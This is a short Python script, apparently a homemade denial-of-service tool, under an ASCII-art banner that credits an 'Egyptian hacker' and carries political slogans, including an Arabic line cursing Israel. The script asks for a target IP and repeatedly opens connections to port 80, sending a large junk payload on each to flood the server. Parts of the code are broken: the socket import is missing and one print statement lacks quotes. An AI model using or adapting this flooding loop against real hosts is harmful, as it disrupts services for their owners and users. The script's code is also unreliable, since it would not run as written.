BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
    
    print("""                              
    888888888888888888888
  s 88 ooooooooooooooo 88     s 888888888888888888888888888888888888888
  S 88 888888888888888 88    SS 888888888888888888888888888888888888888
 SS 88 888888888888888 88   SSS 8888                         - --+ 8888
 SS 88 ooooooooooooooo 88  sSSS 8888 Egyptian hacker/:-          | 8888
sSS 88 888888888888888 88 SSSSS 8888                               8888
SSS 88 888888888888888 88 SSSSS 8888        𝐀𝐁𝐃𝐀𝐋𝐋𝐀 𝐄𝐋𝐌𝐎𝐑𝐒𝐘     | 8888
SSS 88 ooooooooooooooo 88 SSSSS 8888                               8888
SSS 88 888888888888888 88 SSSSS 8888 DDOSS ATTACK ELMORSY          8888
SSS 88 888888888888888 88 SSSSS 8888 So for Palestine beloved      8888
SSS 88 oooooooooo      88 SSSSS 8888 ELmorsy supports              8888
SSS 88 8888888888 .::. 88 SSSSS 8888   the Palestinian cause       8888
SSS 88 oooooooooo :::: 88 SSSSS 8888                               8888
SSS 88 8888888888  `   88 SSSSS 8888                               8888
SSS 88ooooooooooooooooo88  SSSS 8888سكرتير ابليس/عبدالله المرسي يتضامن معا فلسطين
SSS 888888888888888888888__SSSS 8888 عبدالله المرسي يقول كسم اسرائيل وباعلي صوت
SSS |   *  *  *   )8c8888  SSSS 888888888888888888888888888888888888888
SSS 888888888888888888888.  SSS 888888888888888888888888888888888888888
SSS 888888888888888888888 \_ SSsssss oooooooooooooooooooooooooooo ssss
SSS 888888888888888888888  \\   __SS 88+-8+-88============8-8==88 S
SSS 888888888888888888888-. \\  \  S 8888888888888888888888888888
SSS 888888888888888888888  \\\  \\       `.__________.       ` .
SSS 88O8O8O8O8O8O8O8O8O88  \\.   \\______________________________`_.
SSS 88 el cheapo 8O8O8O88 \\   .  \|________________________________|
 SS 88O8O8O8O8o8O8O8O8O88  \\    -.___
  S 888888888888888888888 /~          ~~~~~-----~~~~---.__
 .---------------------------------------------------.    ~--.
 \ \______\ __________________________________________\-------^.-----------.
 :   _   _ _ _ _  _ _ _ _  _ _ _ _   _ _ _           `\        \
 ::\ ,\_\,\_\_\_\_\\_\_\_\_\\_\_\_\_\,\_\_\_\           \      o  8o 8o .
 |::\  -_-_-_-_-_-_-_-_-_-_-_-_-_-___  -_-_-_   _ _ _ _  \      8o 88 88 \
 |_::\ ,\_\_\_\_\_\_\_\_\_\_\_\_\_\___\,\_\_\_\,\_\_\_\_\ \      88       \
    `:\ ,\__\_\_\_\_\_\_\_\_\_\_\_\_\  \,\_\_\_\,\_\_\_\ \ \      88       .
     `:\ ,\__\_\_\_\_\_\_\_\_\_\_\_\____\    _   ,\_\_\_\_\ \      88o    .|
       :\ ,\____\_\_\_\_\_\_\_\_\_\_\____\  ,\_\ _,\_\_\_\ \ \       ooooo 
        :\ ,\__\\__\_______________\__\\__\,\_\_\_\,\___\_\_\ \
         `\  --  -- --------------- --  --   - - -   --- - -   )____________
 `-------------------------------------------------- """)
    
   
ip=input("Enter ip : ");print("Doos in",ip)
for h in range(500):
  try:
      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
      socket.setdefaulttimeout(1)
      Jmeel=knig.connect((ip,80))
      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
      data=data.encode("utf-8")
      knig.send(data)      
      print( [ELMORSY] تم بدا التدمير ,YY,ip, Dos [لاجل فلسطين] in ,CC, port [80] )


  except :
    print(R+"no Doos in ip ",ip)
#   print(C+"                     no problem in the ip",YY,ip)

      

